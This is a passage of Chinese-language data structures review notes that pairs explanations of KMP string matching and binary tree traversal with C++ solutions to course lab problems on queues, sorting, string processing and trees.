mp[x])\n\t\t\t\t{\n\t\t\t\t\tq[i].push(x);\n\t\t\t\t\tbreak;\n\t\t\t\t}//从前往后，前面的队列为初始队列必定有元素，如果出现队列为空的情况说明当前元素不在任何一组，加入队尾\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tbool flag = 0;\n\t\t\tfor (int i = 0; i < 10; i++)\n\t\t\t{\n\t\t\t\tif (!q[i].empty())\n\t\t\t\t{\n\t\t\t\t\tans.push(q[i].front());\n\t\t\t\t\tq[i].pop();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tint sz = ans.size();\n\tfor (int i = 0; i < sz; i++)\n\t{\n\t\tstring x = ans.front();\n\t\tcout << x;\n\t\tif (i != sz - 1)cout << \" \";\n\t\telse cout << endl;\n\t\tans.pop();\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 德才论\n\n题目:\n\n```\n宋代史学家司马光在《资治通鉴》中有一段著名的“德才论”：“是故才德全尽谓之圣人，才德兼亡谓之愚人，德胜才谓之君子，才胜德谓之小人。凡取人之术，苟不得圣人，君子而与之，与其得小人，不若得愚人。”\n\n现给出一批考生的德才分数，请根据司马光的理论给出录取排名。\n\n输入\n输入第一行给出 3 个正整数，分别为：N（≤10e5），即考生总数；L（≥60），为录取最低分数线，即德分和才分均不低于 L 的考生才有资格被考虑录取；H（<100），为优先录取线——德分和才分均不低于此线的被定义为“才德全尽”，此类考生按德才总分从高到低排序；才分不到但德分到线的一类考生属于“德胜才”，也按总分排序，但排在第一类考生之后；德才分均低于 H，但是德分不低于才分的考生属于“才德兼亡”但尚有“德胜才”者，按总分排序，但排在第二类考生之后；其他达到最低线 L 的考生也按总分排序，但排在第三类考生之后。\n随后 N 行，每行给出一位考生的信息，包括：准考证号、德分、才分，其中准考证号为 8 位整数，德才分为区间 [0, 100] 内的整数。数字间以空格分隔。\n\n输出\n输出第一行首先给出达到最低分数线的考生人数 M，随后 M 行，每行按照输入格式输出一位考生的信息，考生按输入中说明的规则从高到低排序。当某类考生中有多人总分相同时，按其德分降序排列；若德分也并列，则按准考证号的升序输出。\n```\n\n样例：\n\n```\n14 60 80\n10000001 64 90\n10000002 90 60\n10000011 85 80\n10000003 85 80\n10000004 80 85\n10000005 82 77\n10000006 83 76\n10000007 90 78\n10000008 75 79\n10000009 59 90\n10000010 88 45\n10000012 80 100\n10000013 90 99\n10000014 66 60\n```\n\n样例输出：\n\n```\n12\n10000013 90 99\n10000012 80 100\n10000003 85 80\n10000011 85 80\n10000004 80 85\n10000007 90 78\n10000006 83 76\n10000005 82 77\n10000002 90 60\n10000014 66 60\n10000008 75 79\n10000001 64 90\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<queue>\nusing namespace std;\n\nstruct node\n{\n\tstring id;\n\tint d, c, sum;\n\tbool operator< (const node a)const\n\t{\n\t\tif (sum == a.sum)\n\t\t{\n\t\t\tif (d == a.d)\n\t\t\t{\n\t\t\t\treturn id > a.id;\n\t\t\t}\n\t\t\treturn d < a.d;\n\t\t}\n\t\treturn sum < a.sum;\n\t}\n};\n\nint main()\n{\n\tint n, l, h;\n\tint cnt = 0;\n\tpriority_queue<node>q[4];\n\tcin >> n >> l >> h;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tstring id;\n\t\tint d, c;\n\t\tcin >> id >> d >> c;\n\t\tif (d >= h && c >= h)\n\t\t{\n\t\t\tq[0].push({ id,d,c,d + c });\n\t\t\tcnt++;\n\t\t}\n\t\telse if (d >= h && c >= l && c < h)\n\t\t{\n\t\t\tq[1].push({ id,d,c,d + c });\n\t\t\tcnt++;\n\t\t}\n\t\telse if (d >= l && c >= l && d > c)\n\t\t{\n\t\t\tq[2].push({ id,d,c,d + c });\n\t\t\tcnt++;\n\t\t}\n\t\telse if (d >= l && c >= l)\n\t\t{\n\t\t\tq[3].push({ id,d,c,d + c });\n\t\t\tcnt++;\n\t\t}\n\t}\n\tcout << cnt << endl;\n\tfor (int i = 0; i < cnt; i++)\n\t{\n\t\tfor (int i = 0; i < 4; i++)\n\t\t{\n\t\t\tif (!q[i].empty())\n\t\t\t{\n\t\t\t\tnode a = q[i].top();\n\t\t\t\tcout << a.id << ' ' << a.d << ' ' << a.c << endl;\n\t\t\t\tq[i].pop();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n## 串\n\n### KMP\n\n主要思想:当一趟匹配过程中出现字符比较不等(失配)时\n\n​\t1.不需回溯i指针\n\n​\t2.将模式向右“滑动”尽可能远的一段距离(next[j])后，继续进行比较\n\n\n\n假设主串为 ”s0s1s2…sn-1“，\n\n模式串为 “p0p1p2…pm-1”\n\n##### next值计算\n\n下标从0开始的next表：\n\n* 第一种情况\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230131191259779.png\" alt=\"image-20230131191259779\" style=\"zoom: 50%;\" />\n\n  $s_i$和$p_0$失配，此时，应比较$s_{i+1}$和$p_0$。\n\n  KMP算法中，比较下一个ｉ++，ｊ++，因此记next[0] = -1。\n\n* 第二种情况\n\n  主串中第i个字符与模式串中第j个字符“失配”,j>0\n\n  此时，前j个字符匹配，即 $p_0p_1…p_{j-1} = s_{i-j}s_{i-j+1}…s_{i-1}$\n\n  表格表示如下\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131191928010.png\" alt=\"image-20230131191928010\" style=\"zoom:50%;\" />\n\n表中黑色字体表示对应列字符相等，红色表示 $s_i≠p_j$。\n\n根据KMP算法思想，$s_i$不动，$s_i$与$p_{next[j]}$比较。记k=next[j]，显然，0<k<j。$s_i$与$p_k$比较有意义，一定是前面0…k-1字符与$s_i$前的k个字符对应相等。\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131192140591.png\" style=\"zoom:50%;\" />\n\np根据上表字符对应关系，有\n\n​    $p_0p_1…p_{k-1} = p_{j-k}p_{j-k+1}…p_{j-1}$\n\n 即为第二种情况，k值应满足的公式。\n\n\n\np公式表明next的计算与主串无关，根据模式串可计算next值。k值满足模式串的前0到k-1字符(共k个）等于j前面的j-k到j-1字符(共k个)。即已经部分匹配。\n\np显然，部分匹配字符越多越好，因此k取满足公式的最大值。\n\nnext函数定义\n\n下标从0开始\n$$\nnext[j]=\\begin{cases}\n-1 \\quad 当j=0,\\\\\nmax \\{ k|0<k<j且'p_0...p_{k-1}' == 'p_{j-k}…p_{j-1}' \\}\\\\\n0 \\quad其他情况\n\\end{cases}\n$$\n下标从1开始\n$$\nnext[j]=\\begin{cases}\n0 \\quad 当j=0,\\\\\nmax \\{ k|0<k<j且'p_0...p_{k-1}' == 'p_{j-k}…p_{j-1}' \\}\\\\\n1 \\quad其他情况\n\\end{cases}\n$$\n\n* 手动计算next\n\n* 递推计算next\n\n  next[0]=-1 → next[1] → next[2] → …… → next[len-1]\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131213821559.png\" alt=\"image-20230131213821559\" style=\"zoom: 25%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131213917284.png\" alt=\"image-20230131213917284\" style=\"zoom: 33%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131213943401.png\" alt=\"image-20230131213943401\" style=\"zoom:33%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131213959055.png\" alt=\"image-20230131213959055\" style=\"zoom:33%;\" />\n\n算法：\n\n```cpp\nj=0,k=-1,next[0]=-1        //初值\n2. while(j<模式串长度-1) {//循环递推,注意越界\n    (1) 若k=-1或者pj=pk,则j++,k++,next[j]=k\n    (2) 否则,k=next[k]\n   }　\n\n```\n\n##### kmp串匹配\n\n举例：\n\n主串ababcabcacbab,模式串abcac\n\nnext:\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131214343898.png\" alt=\"image-20230131214343898\" style=\"zoom:33%;\" />\n\n匹配过程：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131215437861.png\" style=\"zoom:50%;\" />\n\n#### DS串应用--KMP算法\n\n题目:\n\n```\n学习KMP算法，给出主串和模式串，求模式串在主串的位置\n\n输入\n第一个输入t，表示有t个实例\n第二行输入第1个实例的主串，第三行输入第1个实例的模式串\n以此类推\n\n输出\n第一行输出第1个实例的模式串的next值\n第二行输出第1个实例的匹配位置，位置从1开始计算，如果匹配成功输出位置，匹配失败输出0\n以此类推\n```\n\n样例：\n\n```\n3\nqwertyuiop\ntyu\naabbccdd\nccc\naaaabababac\nabac\n```\n\n样例输出：\n\n```\n-1 0 0 \n5\n-1 0 1 \n0\n-1 0 0 1 \n8\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\nvoid getnext(string t, int next[])\n{\n\tint j = 0, k = -1;\n\tnext[j] = k;\n\twhile (j < t.size() - 1)\n\t{\n\t\tif (k == -1 || t[j] == t[k])next[++j] = ++k;\n\t\telse k = next[k];\n\t}\n}\n//求next表\n\nint kmp(string s, string t)\n{\n\tint i, j;\n\tint next[1000];\n\tgetnext(t, next);\n\tfor (i = 0, j = 0; i < s.size() && j < (int)t.size();)\n\t{\n\t\tif (j == -1 || s[i] == t[j])i++, j++;\n\t\telse j = next[j];\n\t}\n\tfor (int i = 0; i < t.size(); i++)\n\t{\n\t\tcout << next[i] << ' ';\n\t}\n\tcout << endl;\n\tif (j == t.size())return i - j;\n\telse return -1;\n}\n//kmp匹配\n\nint main()\n{\n\tint t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tstring s, t;\n\t\tcin >> s >> t;\n\t\tcout << kmp(s, t) + 1 << endl;\n\t}\n\treturn 0;\n}\n```\n\n本题kmp的缺陷：只能进行一次字符串匹配\n\n改进为能够在主串匹配多个字符串：\n\n#### 洛谷P3365 【模板】KMP字符串匹配\n\n[【模板】KMP字符串匹配](https://www.luogu.com.cn/problem/P3375)\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\nusing namespace std;\n\nvoid getnext(string t, int next[])\n{\n\tint j, k;\n\tj = 0, k = -1;\n\tnext[j] = k;\n\twhile (j < t.size())\n\t{\n\t\tif (k == -1 || t[j] == t[k])next[++j] = ++k;\n\t\telse k = next[k];\n\t}\n}\n\nvoid kmp(string s, string t)\n{\n\tint i, j;\n\tint next[1000];\n\tgetnext(t, next);\n\tfor (i = 0, j = 0; i < s.size();)\n\t{\n\t\tif (j == -1 || s[i] == t[j])i++, j++;\n\t\telse j = next[j];\n\t\tif (j == t.size())cout << i - t.size() + 1 << endl, j = next[j - 1], i--;\n        //相比于上题增加了一次匹配成功后在下一个位置继续匹配的操作\n\t}\n\tfor (int i = 0; i < t.size(); i++)\n\t{\n\t\tif (i == t.size() - 1)cout << next[i + 1];\n\t\telse cout << next[i + 1]  << ' ';\n\t}\n}\n\nint main()\n{\n\tstring a, b;\n\tcin >> a >> b;\n\tkmp(a, b);\n\treturn 0;\n}\n```\n\n\n\n##### next值的应用\n\n* 求串的前后缀\n\n  ```\n  例：串eefegeef的next值为：-1 0 1 0 1 0 1 2。\n    next[7] = 2, p[7] = p[2], 因此最长前后缀是eef三个字符。\n  //next多求一位\n  \n    串eefegeek的next值为：-1 0 1 0 1 0 1 2。\n    next[7] = 2, p[7]≠p[2], 因此最长前后缀为空。\n    \n    结论：计算串的next值(0~len)\n        若next[len]=0 , 前后缀为空。否则为\n        p.substr(0,next[len])。\n        next[j]即前面0到j-1子串的最长前、后缀。\n  \n  ```\n\n* 求循环节\n\n  ```\n  给出一个由某个循环节构成的字符串，找出最小的\n  循环节。例如 abababab 最小循环节当是 ab ，\n  而 abab 也是它的循环节，但并非最短。\n  \n  abab的next值为-1 0 0 1 2(len位置)。\n  \n  next数组， 符合 len % (len - next[len] ) == 0 && next[len] != 0 , 则说明字符串循环，而且:\n  循环节长度为:   len - next[len]\n  循环次数为:     len / (len - next[len])\n  ```\n\n* 求串后最少补多少个字符，使其成为完整的循环串。   \n\n  ```cpp\n  ababa， next值为：-1 0 0 1 2 3（len长度）\n  最小循环节长度：len - next[len] = 5- 3 = 2;\n  补字符个数：2 - len%2 = 1个。\n  \n  最小循环节长度：MinCirLen = len - next[len]\n  补字符个数：MinCirLen – len % MinCirLen\n  MinCirLen = len – next[len];\n  if( len % MinCirLen  == 0 && next[len])  \n       //补0个字符\n  else\n       //补 MinCirLen – len%MinCirLen 个字符\n  ```\n\n  \n\n#### DS串应用--串替换\n\n题目:\n\n```\n给出主串、模式串、替换串，用KMP算法找出模式串在主串的位置，然后用替换串的字符替换掉模式串\n本题只考虑一处替换的情况，如果你想做的完美一些，能够实现多处替换那\n可能需要考虑模式串和替换串长度不一致的情况\n\n输入\n第一个输入t，表示有t个实例\n第二行输入第1个实例的主串，第三行输入第1个实例的模式串，第四行输入第1个实例的替换串\n以此类推\n\n输出\n第一行输出第1个实例的主串\n第二行输出第1个实例的主串替换后结果，如果没有发生替换就输出主串原来的内容。\n以此类推\n```\n\n样例：\n\n```\n3\naabbccdd\nbb\nff\naaabbbccc\nddd\neee\nabcdef\nabc\nccccc\n```\n\n样例输出：\n\n```\naabbccdd\naaffccdd\naaabbbccc\naaabbbccc\nabcdef\ncccccdef\n```\n\nAC代码：\n\n这里应用了string类的replace函数和find函数，写起来相对简单\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\nint main()\n{\n\tint t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tstring s;\n\t\tcin >> s;\n\t\tcout << s << endl;\n\t\tstring t1, t2;\n\t\tcin >> t1 >> t2;\n\t\twhile (s.find(t1) != -1)\n\t\t{\n\t\t\ts.replace(s.find(t1), t1.size(), t2);\n\t\t}\n\t\tcout << s << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 串应用- 计算一个串的最长的真前后缀\n\n题目:\n\n```\n给定一个串，如ABCDAB，则ABCDAB的真前缀有：{ A, AB,ABC, ABCD, ABCDA }ABCDAB的真后缀有：{ B, AB,DAB, CDAB, BCDAB } 因此，该串的真前缀和真后缀中最长的相等串为AB，我们称之为该串的“最长的真前后缀”。试实现一个函数string matched_Prefix_Postfix(string str)，得到输入串str的最长的真前后缀。若不存在最长的真前后缀则输出empty\n\n输入\n第1行：串的个数 n第2行到第n+1行：n个字符串\n\n输出\nn个最长的真前后缀，若不存在最长的真前后缀则输出empty。\n```\n\n样例：\n\n```\n6\na\nab\nabc\nabcd\nabcda\nabcdab\n```\n\n样例输出：\n\n```\nempty\nempty\nempty\nempty\na\nab\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\nvoid getnext(string t, int next[])\n{\n\tint j = 0, k = -1;\n\tnext[j] = k;\n\twhile (j < t.size())\n\t{\n\t\tif (k == -1 || t[j] == t[k])next[++j] = ++k;\n\t\telse k = next[k];\n\t}\n}\n\nstring matched_Prefix_Postfix(string str)\n{\n\tint next[1000];\n\tgetnext(str, next);\n\tint x = next[str.size()];\n\tif (x <= 0)return  \"empty\";\n\telse return str.substr(0, x);\n}\n\nint main()\n{\n\tint t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tstring s;\n\t\tcin >> s;\n\t\tcout << matched_Prefix_Postfix(s) << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 子串循环问题 (Ver. I)\n\n题目:\n\n```\n给定一个字符串，求需要添加至少几个字符到字符串末尾才能使得整个字符串串由某一个不为本身的子串循环构成？\n如\"abca\"，添加\"bc\"后构成\"abcabc\"，其由子串\"abc\"循环构成;也可以添加\"abca\"后构成\"abcaabca\"，其由子串\"abca\"循环构成，相比之下\"bc\"只有2个字符，添加的字符量最少。\n\n输入\n第一行包括一个整数T(1 <= T <= 100)，代表测试组数\n每组测试数据包括一行字符串，其长度范围为 [3, 10^4]\n\n输出\n对于每组测试数据\n输出一个整数N，代表添加的最小字符数量\n```\n\n样例：\n\n```\n3\naaa\nabca\nabcdefg\n```\n\n样例输出：\n\n```\n0\n2\n7\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\nvoid getnext(string t, int next[])\n{\n\tint j = 0, k = -1;\n\tnext[j] = k;\n\twhile (j < t.size())\n\t{\n\t\tif (k == -1 || t[j] == t[k])next[++j] = ++k;\n\t\telse k = next[k];\n\t}\n}\n\nint main()\n{\n\tint t;\n\tcin >> t;\n\tint next[10005];\n\twhile (t--)\n\t{\n\t\tstring s;\n\t\tcin >> s;\n\t\tgetnext(s, next);\n\t\tint mincirlen = s.size() - next[s.size()];\n\t\tint ans;\n\t\tif (s.size() % mincirlen == 0 && next[s.size()])ans = 0;\n\t\telse ans = mincirlen - s.size() % mincirlen;\n\t\tcout << ans << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 可重叠子串 (Ver. I)\n\n题目:\n\n```\n给定一个字符串（模式串）和一些待查找的字符串，求每个待查找字符串在模式串中出现的次数（可重叠）\n\n输入\n第一行输入t，表示有t组测试数据\n每一组测试数据包含多行：\n每一组的第一行包括一个字符串P，长度不超过105，且非空串\n每一组的第二行包括一个整数N，代表待查找的字符串数量 (1 <= N <= 5)\n每一组接下来的N行，每一行包括一个待查找的字符串，其长度不超过50，且非空串\n\n输出\n对于每组测试数据，\n输出每个待查找字符串出现的次数，\n具体输出见样例\n```\n\n样例：\n\n```\n2\naabbcc\n3\naa\nbb\ncc\nababab\n1\naba\n```\n\n样例输出：\n\n```\naa:1\nbb:1\ncc:1\naba:2\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\nvoid getnext(string t, int next[])\n{\n\tint j = 0, k = -1;\n\tnext[j] = k;\n\twhile (j < t.size() - 1)\n\t{\n\t\tif (k == -1 || t[j] == t[k])next[++j] = ++k;\n\t\telse k = next[k];\n\t}\n}\n\nint kmp(string s, string t)\n{\n\tint i, j, cnt = 0;\n\tint next[1000];\n\tgetnext(t, next);\n\tfor (i = 0, j = 0; i < s.size();)\n\t{\n\t\tif (j == -1 || s[i] == t[j])i++, j++;\n\t\telse j = next[j];\n\t\tif (j == t.size())cnt++, j = next[j - 1], i--;\n\t}\n\treturn cnt;\n}\n\nint main()\n{\n\tint t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tstring s, t;\n\t\tint n;\n\t\tcin >> s >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcin >> t;\n\t\t\tcout << t << ':' << kmp(s, t) << endl;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 方程解析（string练习)\n\n题目:\n\n```\n以ax^2+bx+c的形式输入方程ax^2+bx+c=0。请用string或regex_match解析出方程的a、b、c。\n例如：-10x^2+8x ， 则a=-10, b = 8 , c = 0。\n10x ,  则a = 0, b=10, c = 0。\n\n输入\n测试数据有多组\n每组测试数据一行，为ax^2+bx+c, 其中a,b,c均为整数，若为0,则该项可不出现。x前系数为+1，-1，1可不出现。\n假设方程数据无非法情况。\n\n输出\n对每组测试数据，输出每个方程的系数a,b,c。格式见样例\n```\n\n样例：\n\n```\n0\n-x^2\n10x^2-9x+7\n10x\n-10x^2+8x\n-123\n```\n\n样例输出：\n\n```\n0 0 0\n-1 0 0\n10 -9 7\n0 10 0\n-10 8 0\n0 0 -123\n```\n\nAC代码：\n\n本题样例输入方程的指数次数次序固定，因此每次查找系数之后直接在原字符串中去掉该项便于下一次查找\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\nint main()\n{\n\tstring s;\n\tint a, b, c;\n\twhile (cin >> s)\n\t{\n\t\tif (s.find(\"x^2\") != -1)\n\t\t{\n\t\t\tbool flag = 0;\n\t\t\tif (s[0] == '-')flag = 1, s.erase(0, 1);\n\t\t\tif (s[0] >= '0' && s[0] <= '9')\n\t\t\t{\n\t\t\t\ta = s[0] - '0';\n\t\t\t\tfor (int i = 1; i < s.find(\"x^2\"); i++)a = a * 10 + s[i] - '0';\n\t\t\t}\n\t\t\telse \ta = 1;\n\t\t\tif (flag)a = -a;\n\t\t\ts.erase(0, s.find(\"x^2\") + 3);\n\t\t}\n\t\telse a = 0;\n\n\t\tif (s.find(\"x\") != -1)\n\t\t{\n\t\t\tbool flag = 0;\n\t\t\tif (s[0] == '-')flag = 1, s.erase(0, 1);\n\t\t\tif (s[0] == '+')s.erase(0, 1);\n\t\t\tif (s[0] >= '0' && s[0] <= '9')\n\t\t\t{\n\t\t\t\tb = s[0] - '0';\n\t\t\t\tfor (int i = 1; i < s.find(\"x\"); i++)b = b * 10 + s[i] - '0';\n\t\t\t}\n\t\t\telse \tb = 1;\n\t\t\tif (flag)b = -b;\n\t\t\ts.erase(0, s.find(\"x\") + 1);\n\t\t}\n\t\telse b = 0;\n\n\t\tbool flag = 0;\n\t\tif (s[0] == '-')flag = 1, s.erase(0, 1);\n\t\telse if (s[0] == '+')s.erase(0, 1);\n\t\tif (s[0] >= '0' && s[0] <= '9')\n\t\t{\n\t\t\tc = s[0] - '0';\n\t\t\tfor (int i = 1; i < s.size(); i++)c = c * 10 + s[i] - '0';\n\t\t}\n\t\tif (!s.size())c = 0;\n\t\tif (flag)c = -c;\n\n\t\tcout << a << ' ' << b << ' ' << c << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n## 树\n\n#### 二叉树\n\n* 性质\n\n  1、在二叉树的第i层上至多有$2^{i-1}$个结点\n\n  2、深度为k的二叉树至多有$2^k$-1个结点\n\n  3、深度为k的完全二叉树至少有$2^{k-1}$个结点\n\n  4、如果二叉树终端结点数为$n_0$，度为2的结点数为$n_2$，则$n_0=n_2+1$\n\n  \n\n##### 二叉树的遍历\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201123002617.png\" alt=\"image-20230201123002617\" style=\"zoom:50%;\" />\n\n对于上图中的二叉树：\n\n* 层次遍历：ABCDEFG\n\n* 先序遍历：ABDEGCF\n\n* 中序遍历：DBGEAFC\n\n* 后序遍历：DGEBFCA\n\n\n\n#####树的遍历\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201141211619.png\" alt=\"image-20230201141211619\" style=\"zoom:50%;\" />\n\n* 先根遍历\n\n  对应二叉树的先序遍历\n\n  A BEF C DG\n\n* 后根遍历\n\n  对应二叉树的中序遍历\n\n  EFB C GD A\n\n\n\n##### 森林的遍历\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201141455652.png\" alt=\"image-20230201141455652\" style=\"zoom:50%;\" />\n\n* 先序遍历\n\n  从左至右对每一棵树进行先根遍历\n\n  ABCDE FG HIKJ\n\n* 中序遍历\n\n  从左至右对每一棵树进行后跟遍历\n\n  BCEDA GF KIJH\n\n\n\n#### DS二叉树--叶子数量\n\n题目:\n\n```\n计算一颗二叉树包含的叶子结点数量。\n\n提示：叶子是指它的左右孩子为空。\n\n建树方法采用“先序遍历+空树用0表示”的方法，即给定一颗二叉树的先序遍历的结果为AB0C00D00，其中空节点用字符‘0’表示。则该树的逻辑结构如下图。\n```\n\n<img src=\"深圳大学数据结构期末复习与实验代码/3aa2359f68e4640016ec4f204bd6c385_1.png\" alt=\"3aa2359f68e4640016ec4f204bd6c385_1\" style=\"zoom: 50%;\" />\n\n```\n输入\n第一行输入一个整数t，表示有t个测试数据\n第二行起输入二叉树先序遍历的结果，空树用字符‘0’表示，输入t行\n\n输出\n逐行输出每个二叉树的包含的叶子数量\n```\n\n样例：\n\n```\n3\nAB0C00D00\nAB00C00\nABC00D00E00\n```\n\n样例输出：\n\n```\n2\n2\n3\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nclass BITnode\n{\n\tchar node;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r) :node(e), lson(l), rson(r) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n};\n\nclass BItree\n{\n\tint leaves;\n\tBITnode* root;\n\tBITnode* buildtree(string s, int &i);\n\tint cntleaves(BITnode*T);\npublic:\n\tBItree() { leaves = 0; };\n\tvoid buildtree(string s);\n\tvoid cntleaves();\n\tint getleaves() { return leaves; }//通过共有函数传参给私有函数再调用私有函数完成操作\n};\n\nBITnode * BItree::buildtree(string s, int& i)//这里的i前面的&是必要的，否则会出现右子树建树时i的值回退\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '0')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL);\n\t\tT->setlson(buildtree(s, ++i));\n\t\tT->setrson(buildtree(s, ++i));\n\t}\n\treturn T;\n}//先序遍历序列创建二叉树\n\nvoid BItree::buildtree(string s)\n{\n\tint i = 0;\n\troot = buildtree(s, i);\n}//建树\n\nvoid BItree::cntleaves()\n{\n\tcntleaves(root);\n}//计算叶子数量\n\nint BItree::cntleaves(BITnode* T)\n{\n\tif (T)\n\t{\n\t\tint ls = cntleaves(T->getlson());\n\t\tint rs = cntleaves(T->getrson());\n\t\tif (ls == -1 && rs == -1)leaves++;\n\t\treturn 1;\n\t}\n\treturn -1;\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> tree;\n\t\tBItree bt;\n\t\tbt.buildtree(tree);\n\t\tbt.cntleaves();\n\t\tcout << bt.getleaves() << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉树——二叉树之父子结点\n\n题目:\n\n```\n给定一颗二叉树的逻辑结构如下图，（先序遍历的结果，空树用字符‘0’表示，例如AB0C00D00），建立该二叉树的二叉链式存储结构。\n编写程序输出该树的所有叶子结点和它们的父亲结点\n\n输入\n第一行输入一个整数t，表示有t个二叉树\n第二行起，按照题目表示的输入方法，输入每个二叉树的先序遍历，连续输入t行\n\n输出\n第一行按先序遍历，输出第1个示例的叶子节点\n第二行输出第1个示例中与叶子相对应的父亲节点\n以此类推输出其它示例的结果\n```\n\n样例：\n\n```\n3\nAB0C00D00\nAB00C00\nABCD0000EF000\n```\n\n样例输出：\n\n```\nC D \nB A \nB C \nA A \nD F \nC E \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\nusing namespace std;\n\nclass BITnode\n{\n\tchar node;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r) :node(e), lson(l), rson(r) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n};\n\nclass BItree\n{\n\tint leaves;\n\tBITnode* root;\n\tBITnode* buildtree(string s, int &i);\n\tint printleaves(BITnode*T);\n\tvector<char> father;\npublic:\n\tBItree() { leaves = 0; };\n\tvoid buildtree(string s);\n\tvoid printleaves();\n\tvoid printfather();\n};\n\nBITnode * BItree::buildtree(string s, int& i)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '0')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL);\n\t\tT->setlson(buildtree(s, ++i));\n\t\tT->setrson(buildtree(s, ++i));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s)\n{\n\tint i = 0;\n\troot = buildtree(s, i);\n}\n\nvoid BItree::printleaves()\n{\n\tprintleaves(root);\n}\n\nint BItree::printleaves(BITnode* T)\n{\n\tif (T)\n\t{\n\t\tint ls = printleaves(T->getlson());\n\t\tif (!ls)father.push_back(T->getnode());\n\t\tint rs = printleaves(T->getrson());\n\t\tif (!rs)father.push_back(T->getnode());\n\t\tif (ls == -1 && rs == -1)\n\t\t{\n\t\t\tcout << T->getnode() << ' ';\n\t\t\treturn 0;\n\t\t}\n\t\treturn 1;\n\t}\n\treturn -1;\n}\n\nvoid BItree::printfather()\n{\n\tfor (int i = 0; i < father.size(); i++)cout << father[i] << ' ';\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> tree;\n\t\tBItree bt;\n\t\tbt.buildtree(tree);\n\t\tbt.printleaves();\n\t\tcout << endl;\n\t\tbt.printfather();\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS树--二叉树高度\n\n题目:\n\n```\n给出一棵二叉树，求它的高度。二叉树的创建采用前面实验的方法。\n注意，二叉树的层数是从1开始\n\n输入\n第一行输入一个整数t，表示有t个二叉树\n第二行起输入每个二叉树的先序遍历结果，空树用字符‘0’表示，连续输入t行\n\n输出\n每行输出一个二叉树的高度\n```\n\n样例：\n\n```\n1\nAB0C00D00\n```\n\n样例输出：\n\n```\n3\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nclass BITnode\n{\n\tchar node;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r) :node(e), lson(l), rson(r) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n};\n\nclass BItree\n{\n\tint maxdepth;\n\tBITnode* root;\n\tBITnode* buildtree(string s, int &i);\n\tint cntdepth(BITnode*T, int d);\npublic:\n\tBItree() { maxdepth = 0; };\n\tvoid buildtree(string s);\n\tvoid cntdepth();\n\tint getmaxdepth() { return maxdepth; }\n};\n\nBITnode * BItree::buildtree(string s, int& i)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '0')\n\t{\n\t\tT = new BITnode(s[i], NULL, 